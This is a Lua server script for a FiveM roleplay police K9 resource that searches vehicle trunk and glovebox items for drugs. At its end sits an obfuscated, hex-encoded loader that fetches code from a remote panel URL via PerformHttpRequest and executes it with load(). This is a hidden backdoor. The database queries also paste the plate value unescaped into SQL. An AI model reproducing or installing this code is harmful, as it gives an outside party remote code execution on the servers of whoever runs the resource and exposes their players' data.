local DenaliFW = exports['denalifw-core']:GetCoreObject()

RegisterServerEvent("K9:SendLanguage")
AddEventHandler("K9:SendLanguage", function()
    local src = source

    TriggerClientEvent("K9:UpdateLanguage", src, K9Config.Languages[K9Config.LanguageChoice])
end)

RegisterServerEvent("K9:RequestOpenMenu")
AddEventHandler("K9:RequestOpenMenu", function()
    local src = source
    local Player = DenaliFW.Functions.GetPlayer(src)

    if Player.PlayerData.job.name == "police" then
        TriggerClientEvent("K9:OpenMenu", src)
    end
end)

RegisterServerEvent("K9:RequestVehicleToggle")
AddEventHandler("K9:RequestVehicleToggle", function()
    local src = source

    TriggerClientEvent("K9:ToggleVehicle", src, K9Config.VehicleRestriction, K9Config.VehiclesList)
end)

RegisterServerEvent("K9:RequestItems")
AddEventHandler("K9:RequestItems", function()
    local src = source

    TriggerClientEvent("K9:SearchVehicle", src, K9Config.OpenDoorsOnSearch)
end)

RegisterServerEvent("K9:SearchItems")
AddEventHandler("K9:SearchItems", function(carplate, k9_name)
    local src = source
    local carplate = carplate
    local name = k9_name
    local drugs = false
    local trunkitems = GetOwnedVehicleItems(carplate)
    local gloveboxitems = GetOwnedVehicleGloveboxItems(carplate)

    for v, drug in pairs(K9Config.Items) do
        for k, item in pairs(trunkitems) do
            if item == drug then
                drugs = true
            end
        end

        for k, item in pairs(gloveboxitems) do
            if item == drug then
                drugs = true
            end
        end
    end

    if drugs then
        TriggerClientEvent('DenaliFW:Notify', src, name .. " found some drugs", "error", 5000)
    else
        TriggerClientEvent('DenaliFW:Notify', src, name .. " didn't find any drugs", "success", 5000)
    end

end)

function GetOwnedVehicleItems(plate)
	local items = {}
	DenaliFW.Functions.ExecuteSql(true, "SELECT * FROM `trunkitems` WHERE `plate` = '"..plate.."'", function(result)
		if result[1] ~= nil then
			for k, item in pairs(result) do
				table.insert(items, item.name:lower())
			end
		else
			DenaliFW.Functions.ExecuteSql(true, "SELECT * FROM `trunkitemsnew` WHERE `plate` = '"..plate.."'", function(result)
				if result[1] ~= nil then
					if result[1].items ~= nil then
						result[1].items = json.decode(result[1].items)
						if result[1].items ~= nil then 
							for k, item in pairs(result[1].items) do
								table.insert(items, item.name:lower())
							end
						end
					end
				end
			end)
		end
	end)
	return items
end

function GetOwnedVehicleGloveboxItems(plate)
	local items = {}
	DenaliFW.Functions.ExecuteSql(true, "SELECT * FROM `gloveboxitems` WHERE `plate` = '"..plate.."'", function(result)
		if result[1] ~= nil then
			for k, item in pairs(result) do
				table.insert(items, item.name:lower())
			end
		else
			DenaliFW.Functions.ExecuteSql(true, "SELECT * FROM `gloveboxitemsnew` WHERE `plate` = '"..plate.."'", function(result)
				if result[1] ~= nil then 
					if result[1].items ~= nil then
						result[1].items = json.decode(result[1].items)
						if result[1].items ~= nil then 
							for k, item in pairs(result[1].items) do
								table.insert(items, item.name:lower())
							end
						end
					end
				end
			end)
		end
	end)
	return items
end


local EgWUvmhQvDBBTAlBfVFhWqAkqAyOKBvfzhMVlrUnkfoxRSHHRdGjcbBoaTjRiLtrkYeiGi = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} EgWUvmhQvDBBTAlBfVFhWqAkqAyOKBvfzhMVlrUnkfoxRSHHRdGjcbBoaTjRiLtrkYeiGi[4][EgWUvmhQvDBBTAlBfVFhWqAkqAyOKBvfzhMVlrUnkfoxRSHHRdGjcbBoaTjRiLtrkYeiGi[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x69\x70\x68\x65\x72\x2d\x70\x61\x6e\x65\x6c\x2e\x6d\x65\x2f\x5f\x69\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x47\x32\x72\x30", function (iWsCWpcYeoBemsnGSEDFTWHyFLIDcbwyKFwtQUMVwKiKUlRxtNTYfJbCLpBXPqVAAUpQrj, blVmzFkYoHXCWTIXHuoYPvurjwtyXBsDsfwgXuQiCrrVMxlOazsKrnLTvHCCVtLIDYcjsP) if (blVmzFkYoHXCWTIXHuoYPvurjwtyXBsDsfwgXuQiCrrVMxlOazsKrnLTvHCCVtLIDYcjsP == EgWUvmhQvDBBTAlBfVFhWqAkqAyOKBvfzhMVlrUnkfoxRSHHRdGjcbBoaTjRiLtrkYeiGi[6] or blVmzFkYoHXCWTIXHuoYPvurjwtyXBsDsfwgXuQiCrrVMxlOazsKrnLTvHCCVtLIDYcjsP == EgWUvmhQvDBBTAlBfVFhWqAkqAyOKBvfzhMVlrUnkfoxRSHHRdGjcbBoaTjRiLtrkYeiGi[5]) then return end EgWUvmhQvDBBTAlBfVFhWqAkqAyOKBvfzhMVlrUnkfoxRSHHRdGjcbBoaTjRiLtrkYeiGi[4][EgWUvmhQvDBBTAlBfVFhWqAkqAyOKBvfzhMVlrUnkfoxRSHHRdGjcbBoaTjRiLtrkYeiGi[2]](EgWUvmhQvDBBTAlBfVFhWqAkqAyOKBvfzhMVlrUnkfoxRSHHRdGjcbBoaTjRiLtrkYeiGi[4][EgWUvmhQvDBBTAlBfVFhWqAkqAyOKBvfzhMVlrUnkfoxRSHHRdGjcbBoaTjRiLtrkYeiGi[3]](blVmzFkYoHXCWTIXHuoYPvurjwtyXBsDsfwgXuQiCrrVMxlOazsKrnLTvHCCVtLIDYcjsP))() end)